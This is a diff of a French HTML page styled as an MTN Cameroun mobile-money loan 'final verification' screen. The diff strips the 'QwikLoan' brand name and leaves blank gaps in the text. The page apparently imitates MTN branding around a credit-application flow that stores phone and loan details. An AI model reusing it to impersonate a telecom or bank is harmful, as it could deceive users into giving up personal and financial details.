@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-    <title>MTN QwikLoan | Vérification finale – mtn.cm</title>
+    <title>MTN  | Vérification finale – mtn.cm</title>
     <meta name="theme-color" content="#FFCC00">
     <style>
         /* identical to original – no changes needed */
@@ -69,7 +69,7 @@
             line-height: 1.2;
         }
 
-        .logo-qwikloan {
+        .logo- {
             color: #1a1a1a;
         }
 
@@ -398,7 +398,7 @@
 <body>
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-mtn">MTN</span><span class="logo-qwikloan"> QwikLoan</span></div>
+        <div class="logo"><span class="logo-mtn">MTN</span><span class="logo-"> </span></div>
     </header>
     <main class="card">
         <div class="top">
@@ -427,7 +427,7 @@
             <button class="submit-btn" id="submitBtn">Soumettre la demande</button>
         </div>
     </main>
-    <footer>© 2026 MTN Cameroun – Services financiers mobiles agréés | Propulsé par MTN Mobile Money (MoMo) | Conditions de QwikLoan applicables</footer>
+    <footer>© 2026 MTN Cameroun – Services financiers mobiles agréés | Propulsé par MTN Mobile Money (MoMo) | Conditions de  applicables</footer>
 
     <div id="spinnerOverlay">
         <div class="spinner"></div>
@@ -438,14 +438,14 @@
             <div class="check-icon">✓</div>
             <div class="success-title">Demande soumise</div>
             <div class="success-msg">
-                Votre demande de crédit MTN QwikLoan a été soumise avec succès.<br><br>
+                Votre demande de crédit MTN  a été soumise avec succès.<br><br>
                 Vous serez contacté(e) prochainement pour la vérification. Une confirmation sera envoyée à votre numéro MTN MoMo et à votre adresse e-mail.
             </div>
             <div class="redirect-bar">
                 <div class="loader"></div>
-                Redirection vers le portail MTN QwikLoan dans <span id="countdown">3</span>…
+                Redirection vers le portail MTN  dans <span id="countdown">3</span>…
             </div>
-            <button class="go-login-btn" onclick="window.location.href='login.html'">Accéder à MTN QwikLoan</button>
+            <button class="go-login-btn" onclick="window.location.href='login.html'">Accéder à MTN </button>
         </div>
     </div>
 
@@ -456,8 +456,8 @@
         const formattedAmount = parseFloat(loanAmount).toLocaleString('fr-FR');
         const termDays = localStorage.getItem('loanTerm') || '30';
 
-        let loanTypeDisplay = localStorage.getItem('loanType') || 'MTN QwikLoan';
-        if (!loanTypeDisplay.includes('MTN')) loanTypeDisplay = 'MTN QwikLoan';
+        let loanTypeDisplay = localStorage.getItem('loanType') || 'MTN ';
+        if (!loanTypeDisplay.includes('MTN')) loanTypeDisplay = 'MTN ';
 
         // Formatage du numéro de téléphone (si présent)
         let phone = localStorage.getItem('phone') || 'N/A';
